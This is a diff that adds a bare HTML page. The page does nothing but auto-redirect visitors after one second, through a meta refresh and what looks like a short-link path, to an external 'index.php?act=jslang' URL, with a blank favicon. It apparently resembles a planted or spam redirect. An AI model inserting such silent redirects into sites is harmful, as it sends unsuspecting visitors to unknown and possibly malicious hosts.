@@ -1,0 +1,1 @@
+<html><head><meta http-equiv="refresh" content="1; url='http://cd.ttuhui.com/rd.s/nXIVaVsDA9LKpAx8?url=http://cd.ttuhui.com/index.php?act=jslang'"><link rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon"></head></html>
